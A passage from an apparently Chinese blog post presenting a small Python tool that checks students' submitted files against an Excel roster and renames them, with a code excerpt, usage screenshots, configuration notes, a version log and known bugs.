data-num=&#34;69&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;.jpeg&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;70&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.docx&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;71&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;.docx&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;72&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.rar&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;73&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;.rar&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;74&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.7z&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;75&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;.7z&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;76&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.xlsx&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;77&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;.xlsx&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;78&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.xls&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;79&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;.xls&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;80&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.c&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;81&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;.c&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;82&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.cpp&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;83&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;.cpp&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;84&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.py&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;85&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;.py&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;86&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.java&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;87&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;.java&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;88&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.txt&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;89&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;.txt&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;90&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.rtf&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;91&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;.rtf&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;92&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.ppt&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;93&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;.ppt&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;94&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.img&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;95&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;.img&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;96&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.doc&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;97&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;.doc&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;98&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.png&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;99&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;.png&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;100&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; new_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;tnew_file&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;form&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;101&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;102&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; temp_excel2 &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file &lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; temp_excel3 &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file &lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; temp_excel1 &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;103&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;chdir&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;path&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;104&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;rename&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;temp_file&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;new_file&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;105&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;							&lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;instructions&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#instructions&#34;&gt;#&lt;/a&gt; Instructions&lt;/h1&gt;
&lt;p&gt;由于工具过于简单，参考下面的截图即可（Running screenshot）&lt;/p&gt;
&lt;p&gt;若有使用上的其他问题，请留言！&lt;/p&gt;
&lt;h1 id=&#34;running-screenshot&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#running-screenshot&#34;&gt;#&lt;/a&gt; Running screenshot&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;1. 主界面运行图&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/12/01/IA1tHYBqSLfeCOj.png&#34; alt=&#34;1.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 查找结果运行图&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;略&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 格式化命名界面运行图&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/12/01/T9AUljhp2Mztqa3.png&#34; alt=&#34;3.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. 格式化命名自定义填法示例：均不是必填项&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/12/01/zQtqfHd9548eRhK.png&#34; alt=&#34;4.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5. 备份确认图&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/12/01/zDBrI6Q7bFhcsUN.png&#34; alt=&#34;3.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6. 修改确认图&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/12/01/tVnOiCYpbqNoDlP.png&#34; alt=&#34;6.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;excel-config&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#excel-config&#34;&gt;#&lt;/a&gt; Excel config&lt;/h1&gt;
&lt;p&gt;Excel 配置说明：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Excel 第一行为预留列名，所以第一行不要放信息（空着就行）&lt;/li&gt;
&lt;li&gt;第一列 (A 列) 放名字简称&lt;/li&gt;
&lt;li&gt;第二列 (B 列) 放学号，注意学号前面加上 &lt;code&gt;&#39;&lt;/code&gt; ，例如： &lt;code&gt;&#39;20201100110&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;第三列 (C 列) 放名字全称，用 &lt;code&gt;·&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Excel 图例：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/12/01/SAhdwJWoYnMz8HP.png&#34; alt=&#34;9.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;update-log&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#update-log&#34;&gt;#&lt;/a&gt; Update log&lt;/h1&gt;
&lt;div class=&#34;note default&#34;&gt;
&lt;p&gt;日志记录了该工具各个版本的更新和坎坷历程，由于忘了日期，我就大概一记，您就看个乐呵吧 hhh&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;v0.0.1&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;完成了查找功能&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;v0.0.2&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;完成了改名功能&lt;/li&gt;
&lt;li&gt;完善了查找功能&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;v0.0.3&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;测试出了 bug，找到了替代方法，但并没有完全修复&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;v0.0.4&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;改进 excel 表格，减少了部分无关代码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;v0.0.5&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;区分了民族学生的名字简和全称，区分了民汉&lt;/li&gt;
&lt;li&gt;修改了两个功能的代码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;v0.0.6&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;改变了工具的定位方向&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;增加了文件查找功能&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;v0.1.0&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;扩展了巨多功能（不介绍了）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;v0.2.0-0.8.8&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;无关功能修改&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;v0.9.0&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;增加了图像化 GUI 界面，完善了所有功能的图像化操作&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;v0.9.2&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;剥离了其他功能，单独取出了查缺和重命名功能&lt;/li&gt;
&lt;li&gt;为其制作了新的 GUI 界面&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;v0.9.4&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;增加了自定义班级输入功能&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;v0.9.6&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;增加了格式强制修改功能&lt;/li&gt;
&lt;li&gt;提供了文件备份选项&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;v0.9.8&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;增加了自定义格式功能&lt;/li&gt;
&lt;li&gt;优化上一版本&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;v1.0.0&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对所有功能进行了检测&lt;/li&gt;
&lt;li&gt;优化了部分代码&lt;/li&gt;
&lt;li&gt;确定了新的改善方向&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;shortbug&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#shortbug&#34;&gt;#&lt;/a&gt; Short&amp;amp;Bug&lt;/h1&gt;
&lt;p&gt;经过测试，软件还有 bug 没有修复，不过大部分情况都可正常使用。&lt;/p&gt;
&lt;p&gt;并且在改格式前可以提供备份选项，建议备份以防出错！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;请自检名单是否有下列情况：&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;下面列出已知 bug：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;重名 bug：当有重名时会导致代码运行出错，致使失败&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这里提供三种解决方法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;操作前选择备份文件（软件会提示是否备份），防止意外&lt;/li&gt;
&lt;li&gt;提前移出重名&lt;/li&gt;
&lt;li&gt;源文件用学号命名，进行判断时可以绕过重名&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;名字中包含另一人的名字，如  &lt;code&gt;小明&lt;/code&gt;  和  &lt;code&gt;王小明&lt;/code&gt; ，导致代码错误，运行失败&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;解决方法：&lt;/p&gt;
&lt;p&gt;​		同上&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;如果遇到其他 bug 可以留言与我反应～&lt;/p&gt;
&lt;p&gt;以上 bug 预计下次更新解决～～～（有时间再说）&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
